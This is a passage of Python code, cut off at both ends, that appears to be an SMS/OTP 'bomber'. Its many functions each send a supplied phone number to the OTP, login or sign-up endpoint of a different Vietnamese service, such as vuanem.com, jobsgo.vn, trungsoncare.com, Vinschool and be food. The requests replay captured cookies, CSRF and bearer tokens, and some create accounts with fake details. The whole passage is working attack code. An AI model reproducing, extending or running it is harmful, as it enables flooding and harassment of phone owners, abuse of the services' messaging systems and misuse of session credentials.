                    'banner_image_url': 'https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb',
                },
                'isVoucherLogin': False,
                'isVoucherCheckoutLogin': False,
                'isInputPhoneScreen': False,
                'isShowNoticeVoucherScreen': True,
                'userAgent': '',
                'userActions': '',
                'currentUrl': '',
                'urlRedirect': '',
            },
            'dataMeta': [],
            'checksum': 'abbd343083301110a157fda505c7ebc94f2b20945dda7e10e98fd12bd2d3fbd2',
        },
        'updates': [
            {
                'type': 'callMethod',
                'payload': {
                    'id': 'wwyn',
                    'method': 'processMethodOtp',
                    'params': [
                        'sms',
                    ],
                },
            },
        ],
    }

    response = requests.post(
        'https://vuanem.com/livewire/message/customer.login-form',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vuanem1(phone):
    cookies = {
        '_gcl_au': '1.1.1128585024.1735574039',
        '_ga': 'GA1.1.250368982.1735574040',
        '_omappvp': 'VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC',
        '_tt_enable_cookie': '1',
        '_ttp': 'FOAk7BHWqv3mT4nj9RVG0guczge.tt.1',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D',
        'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'omSeen-yb0ikgooj8bthm1nt9fg': '1735574243012',
        'OPT_IN_SHOWN_TIME': '1735888837087',
        '_ga_DRHBMGWWEV': 'GS1.1.1736348543.4.0.1736348543.60.0.977217226',
        '_uetsid': '919ed260cdd111ef9f0a4dbdae8f09e4',
        '_uetvid': '48c62b60c6c611ef99b8e5eb91fdf162',
        '_clck': '1olqljb%7C2%7Cfse%7C0%7C1825',
        'omSeen-xq4g8vc9ua0nvty8bmdi': '1736348546259',
        'moe_uuid': '23c1d9a0-c444-498a-b273-de8f2f5d5674',
        'SESSION': '%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D',
        'om-xq4g8vc9ua0nvty8bmdi': '1736348549226',
        'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        '_clsk': '17fwkno%7C1736348680961%7C2%7C1%7Ce.clarity.ms%2Fcollect',
        'XSRF-TOKEN': 'eyJpdiI6IlplaVU4RWdKR1EzMHMzcDBEYXMrRWc9PSIsInZhbHVlIjoiVHZMZXJoUGN6RXZQVnI0aHpiQ2VFYW8rTkFiWlAvR0xsejFCRVNwYTY1bHRZbFlSNHVhTGsyeUVtTFVWR29FTU5ZejJSRXFGcnd3emtTaWxpRHdDdFhmNisvdnIwSFpubmZvOXFNdmZkR3FkdVFPTkpVNTVJMTYxbFpFOGFCMVUiLCJtYWMiOiIzZjY2MmQ0YjJiNzYyOGQzZmJkY2JlZGU5M2E2NDQ5OTVmYWMxYjI2ODhlYWZiOGMzZjI1OTAxY2I5NDAwN2UzIiwidGFnIjoiIn0%3D',
        'vuanem_session': 'eyJpdiI6ImFNeGhJV2EvNjhHMGJ1WVdSSEJRNVE9PSIsInZhbHVlIjoibDV1aGVoSjcxNTNPN2dKTEhwbFhTNTdkMjZ3SWlBaXhlbEp2TndoaE1IL3lmTGE0dHFTVXFBQXlFWWdKbkpMVFZwM05JbFRUTDVyWThBS3o4K29MSmw4MlgrTUNGRS80dEdOQVNQSi9lc0UzYWdTNWh1cG5iVW1ZSlV1aHFLZnciLCJtYWMiOiIzN2VkOGNmZmI5MDY5MzUwNjg2MzRkZWE2NmI3YmM3MmJiZGY5ZmIzYjQ3MTEzNTllZTk2MzZjOWYxYmIxZjM2IiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1128585024.1735574039; _ga=GA1.1.250368982.1735574040; _omappvp=VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC; _tt_enable_cookie=1; _ttp=FOAk7BHWqv3mT4nj9RVG0guczge.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; omSeen-yb0ikgooj8bthm1nt9fg=1735574243012; OPT_IN_SHOWN_TIME=1735888837087; _ga_DRHBMGWWEV=GS1.1.1736348543.4.0.1736348543.60.0.977217226; _uetsid=919ed260cdd111ef9f0a4dbdae8f09e4; _uetvid=48c62b60c6c611ef99b8e5eb91fdf162; _clck=1olqljb%7C2%7Cfse%7C0%7C1825; omSeen-xq4g8vc9ua0nvty8bmdi=1736348546259; moe_uuid=23c1d9a0-c444-498a-b273-de8f2f5d5674; SESSION=%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D; om-xq4g8vc9ua0nvty8bmdi=1736348549226; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=17fwkno%7C1736348680961%7C2%7C1%7Ce.clarity.ms%2Fcollect; XSRF-TOKEN=eyJpdiI6IlplaVU4RWdKR1EzMHMzcDBEYXMrRWc9PSIsInZhbHVlIjoiVHZMZXJoUGN6RXZQVnI0aHpiQ2VFYW8rTkFiWlAvR0xsejFCRVNwYTY1bHRZbFlSNHVhTGsyeUVtTFVWR29FTU5ZejJSRXFGcnd3emtTaWxpRHdDdFhmNisvdnIwSFpubmZvOXFNdmZkR3FkdVFPTkpVNTVJMTYxbFpFOGFCMVUiLCJtYWMiOiIzZjY2MmQ0YjJiNzYyOGQzZmJkY2JlZGU5M2E2NDQ5OTVmYWMxYjI2ODhlYWZiOGMzZjI1OTAxY2I5NDAwN2UzIiwidGFnIjoiIn0%3D; vuanem_session=eyJpdiI6ImFNeGhJV2EvNjhHMGJ1WVdSSEJRNVE9PSIsInZhbHVlIjoibDV1aGVoSjcxNTNPN2dKTEhwbFhTNTdkMjZ3SWlBaXhlbEp2TndoaE1IL3lmTGE0dHFTVXFBQXlFWWdKbkpMVFZwM05JbFRUTDVyWThBS3o4K29MSmw4MlgrTUNGRS80dEdOQVNQSi9lc0UzYWdTNWh1cG5iVW1ZSlV1aHFLZnciLCJtYWMiOiIzN2VkOGNmZmI5MDY5MzUwNjg2MzRkZWE2NmI3YmM3MmJiZGY5ZmIzYjQ3MTEzNTllZTk2MzZjOWYxYmIxZjM2IiwidGFnIjoiIn0%3D',
        'origin': 'https://vuanem.com',
        'priority': 'u=1, i',
        'referer': 'https://vuanem.com/?utm_source=coccoc&utm_medium=cpc&utm_campaign=1830508&utm_term=vuanem&utm_content=44894959&ctm_event_id=3239749836',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-csrf-token': 'cNOvRERpY1g3uQaQWvQET2eFz1H6wm97X9FoFVMG',
        'x-livewire': 'true',
    }

    json_data = {
        'fingerprint': {
            'id': '9UZ0Bc4g6cAYjnBraW2E',
            'name': 'customer.login-form',
            'locale': 'en',
            'path': '/',
            'method': 'GET',
            'v': 'acj',
        },
        'serverMemo': {
            'children': [],
            'errors': [],
            'htmlHash': '9f3d17c2',
            'data': {
                'phone': phone,
                'email': '',
                'login_by_email': '',
                'method_name': 'zalo',
                'isMethodOtpFormScreen': False,
                'isInputOtpFormScreen': True,
                'isResetOtp': True,
                'otps': [
                    '',
                    '',
                    '',
                    '',
                ],
                'otp': None,
                'bannerLoginWeb': {
                    'id': 54,
                    'created': '2024-10-13 16:32:34',
                    'modified': '2024-10-13 16:32:34',
                    'guid': 'eb1c44e8-695e-441f-a7f6-8ff2fb47e47c',
                    'tieude': 'Login banner',
                    'linklienket': 'https://vuanem.com/',
                    'id_vitrihienthi': 15,
                    'idfilebanner': 219,
                    'ismobile': 1,
                    'thutu': 1,
                    'isweb': 1,
                    'mota': '',
                    'trangthai': 1,
                    'urlhienthi': 'https://vuanem.com/',
                    'end_date': None,
                    'start_date': None,
                    'file': {
                        'id': 219,
                        'guid': '53ec9631-9288-4a74-80dd-e1730f8737cb',
                    },
                    'banner_image_url': 'https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb',
                },
                'bannerLoginMobile': {
                    'id': 54,
                    'created': '2024-10-13 16:32:34',
                    'modified': '2024-10-13 16:32:34',
                    'guid': 'eb1c44e8-695e-441f-a7f6-8ff2fb47e47c',
                    'tieude': 'Login banner',
                    'linklienket': 'https://vuanem.com/',
                    'id_vitrihienthi': 15,
                    'idfilebanner': 219,
                    'ismobile': 1,
                    'thutu': 1,
                    'isweb': 1,
                    'mota': '',
                    'trangthai': 1,
                    'urlhienthi': 'https://vuanem.com/',
                    'end_date': None,
                    'start_date': None,
                    'file': {
                        'id': 219,
                        'guid': '53ec9631-9288-4a74-80dd-e1730f8737cb',
                    },
                    'banner_image_url': 'https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb',
                },
                'isVoucherLogin': False,
                'isVoucherCheckoutLogin': False,
                'isInputPhoneScreen': False,
                'isShowNoticeVoucherScreen': True,
                'userAgent': '',
                'userActions': '',
                'currentUrl': '',
                'urlRedirect': '',
            },
            'dataMeta': [],
            'checksum': 'aaad02cd31f69b146a02a2df7b4bf99feec02f8a89e0ea3f28e7068370b87b6c',
        },
        'updates': [
            {
                'type': 'fireEvent',
                'payload': {
                    'id': 'e88w',
                    'event': 'resetOtp',
                    'params': [],
                },
            },
        ],
    }

    response = requests.post(
        'https://vuanem.com/livewire/message/customer.login-form',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def monkeyjunior(phone): #ap; nhieu ap phet
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 3,
        'phone': phone[1:10],
        'password': '123123aa@',
        'country_code': '+84',
        'is_upgrade': False,
    }

    response = requests.post(
        'https://app.monkeyenglish.net/app/api/v2/account/authen/register',
        params=params,
        headers=headers,
        json=json_data,
    )
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 1,
        'country_code': '+84',
        'phone': phone[1:10],
        'email': '',
    }

    response = requests.post(
            'https://app.monkeyenglish.net/app/api/v1/account/send-opt-verify-pw',
            params=params,
            headers=headers,
            json=json_data,
        )
def medigozl(phone):
    headers = {
        'authority': 'auth.medigoapp.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
def jobsgo(phone):
    cookies = {
        'jobsgo-candidate-redis': '7djmhnao5ogdh7a52v4h6o2mss',
        'ref': 'cc2ef9e9706ab2b4e17c88d542a5c77dc803f72261735ea0984dc8225bd9e97ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A26%3A%22https%253A%252F%252Fjobsgo.vn%252F%22%3B%7D',
        '_csrf-jobsgo-candidate': 'a6d251d1e0179e735226db05fa210a434ee2a24d9456733e36279fdd49295b5ea%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22Gx-_ODO2Wpynvr8CJZ4lBk6CggNwPBnW%22%3B%7D',
        '_ga': 'GA1.1.57842391.1737282681',
        '_gcl_au': '1.1.1298459596.1737282681',
        'jobsgo_app_popup': 'true',
        '_ga_EHD5KK9TRQ': 'GS1.1.1737282680.1.1.1737282683.57.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'jobsgo-candidate-redis=7djmhnao5ogdh7a52v4h6o2mss; ref=cc2ef9e9706ab2b4e17c88d542a5c77dc803f72261735ea0984dc8225bd9e97ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A26%3A%22https%253A%252F%252Fjobsgo.vn%252F%22%3B%7D; _csrf-jobsgo-candidate=a6d251d1e0179e735226db05fa210a434ee2a24d9456733e36279fdd49295b5ea%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22Gx-_ODO2Wpynvr8CJZ4lBk6CggNwPBnW%22%3B%7D; _ga=GA1.1.57842391.1737282681; _gcl_au=1.1.1298459596.1737282681; jobsgo_app_popup=true; _ga_EHD5KK9TRQ=GS1.1.1737282680.1.1.1737282683.57.0.0',
        'Origin': 'https://jobsgo.vn',
        'Referer': 'https://jobsgo.vn/site/register?ref=https%253A%252F%252Fjobsgo.vn%252F',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-CSRF-Token': '0uXekskU5FtY1qvKvDACmRhB5d550nkytYBlyIg_Yh-VnfPNhlCraQ-m0qTKQjraUhvRsju5T3HS5yu_2H0MSA==',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'phone': phone,
    }

    response = requests.post('https://jobsgo.vn/site/verify-zalo', cookies=cookies, headers=headers, data=data)
def kymdan(phone):
    headers = {
        'sec-ch-ua-platform': '"Windows"',
        'x-screen': 'DESKTOP',
        'Referer': 'https://kymdanshop.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'Access-Control-Allow-Credentials': 'true',
        'x-language': 'vn',
        'x-device': 'DESKTOP',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }

    json_data = {
        'last_name': 'lý',
        'first_name': 'an',
        'phone_number_signup': phone,
        'email_signup': 'lklkklk@gmail.com',
        'password_signup': '123321',
    }

    response = requests.post('https://api.kymdanstore.vn/apis/v1/user/register/', headers=headers, json=json_data)
def liena(phone):
    cookies = {
        '_gcl_au': '1.1.632390051.1735136571',
        'PHPSESSID': '10bcc507b902cc2e22a6647cee2c54f2',
        'form_key': 'VECzf7U9YsGnjLhv',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        '_gid': 'GA1.3.1438732137.1737350955',
        '_ga_EG96D1Q288': 'GS1.1.1737350954.7.1.1737350972.42.0.0',
        '_ga': 'GA1.3.99280258.1735136571',
        'form_key': 'VECzf7U9YsGnjLhv',
        'section_data_ids': '{}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.632390051.1735136571; PHPSESSID=10bcc507b902cc2e22a6647cee2c54f2; form_key=VECzf7U9YsGnjLhv; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; _gid=GA1.3.1438732137.1737350955; _ga_EG96D1Q288=GS1.1.1737350954.7.1.1737350972.42.0.0; _ga=GA1.3.99280258.1735136571; form_key=VECzf7U9YsGnjLhv; section_data_ids={}',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.liena.com.vn/la-customer/register',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phone_number': phone,
    }

    response = requests.post(
        'https://www.liena.com.vn/rest/V1/liena/customer/registration/request',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def trungson(phone):
    cookies = {
        'sid_customer_s_558c5': 'cce95f3cd603cce60b9af7f10668ddda-1-C',
        '_gcl_au': '1.1.231307612.1734712657',
        '_ga': 'GA1.1.1766751374.1734712657',
        'klaro': '%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D',
        'popAppNewLogin': '0',
        '_clck': 'c6nec1%7C2%7Cfs5%7C0%7C1815',
        'checkacc': '0',
        '_ga_PYTSCXQW2F': 'GS1.1.1735558954.4.1.1735559222.51.0.1745539696',
        '_clsk': '1plivqm%7C1735559223667%7C3%7C1%7Ce.clarity.ms%2Fcollect',
        '_ga_63MSVPCDN5': 'GS1.1.1735558954.4.1.1735559235.38.0.397851942',
        '_ga_BHEHR1EHZQ': 'GS1.1.1735558953.4.1.1735559235.38.0.1014577330',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'sid_customer_s_558c5=cce95f3cd603cce60b9af7f10668ddda-1-C; _gcl_au=1.1.231307612.1734712657; _ga=GA1.1.1766751374.1734712657; klaro=%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D; popAppNewLogin=0; _clck=c6nec1%7C2%7Cfs5%7C0%7C1815; checkacc=0; _ga_PYTSCXQW2F=GS1.1.1735558954.4.1.1735559222.51.0.1745539696; _clsk=1plivqm%7C1735559223667%7C3%7C1%7Ce.clarity.ms%2Fcollect; _ga_63MSVPCDN5=GS1.1.1735558954.4.1.1735559235.38.0.397851942; _ga_BHEHR1EHZQ=GS1.1.1735558953.4.1.1735559235.38.0.1014577330',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'zalo',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': phone,
        'security_hash': '45ed21c7f436d16c88d9e34145b19665',
    }

    response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
def trungson1(phone):
    cookies = {
        'sid_customer_s_558c5': 'cce95f3cd603cce60b9af7f10668ddda-1-C',
        '_gcl_au': '1.1.231307612.1734712657',
        '_ga': 'GA1.1.1766751374.1734712657',
        'klaro': '%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D',
        'popAppNewLogin': '0',
        '_clck': 'c6nec1%7C2%7Cfs5%7C0%7C1815',
        'checkacc': '0',
        '_ga_PYTSCXQW2F': 'GS1.1.1735558954.4.1.1735559494.7.0.1745539696',
        '_clsk': '1plivqm%7C1735559496193%7C5%7C1%7Ce.clarity.ms%2Fcollect',
        '_ga_63MSVPCDN5': 'GS1.1.1735558954.4.1.1735559513.60.0.397851942',
        '_ga_BHEHR1EHZQ': 'GS1.1.1735558953.4.1.1735559513.60.0.1014577330',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'sid_customer_s_558c5=cce95f3cd603cce60b9af7f10668ddda-1-C; _gcl_au=1.1.231307612.1734712657; _ga=GA1.1.1766751374.1734712657; klaro=%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D; popAppNewLogin=0; _clck=c6nec1%7C2%7Cfs5%7C0%7C1815; checkacc=0; _ga_PYTSCXQW2F=GS1.1.1735558954.4.1.1735559494.7.0.1745539696; _clsk=1plivqm%7C1735559496193%7C5%7C1%7Ce.clarity.ms%2Fcollect; _ga_63MSVPCDN5=GS1.1.1735558954.4.1.1735559513.60.0.397851942; _ga_BHEHR1EHZQ=GS1.1.1735558953.4.1.1735559513.60.0.1014577330',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'sms',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': phone,
        'security_hash': '45ed21c7f436d16c88d9e34145b19665',
    }

    response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
def vinschool(phone):
    headers = {
        'Host': 'one-api.vinschool.edu.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'cache-control': 'no-store',
        'user-agent': 'Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': phone,
        'unique_id': '274889DD-7051-4F23-9A28-F54E73F77A9A',
    }


    response = requests.post(
            'https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp',
            headers=headers,
            json=json_data,
        )
def befood(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': phone,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
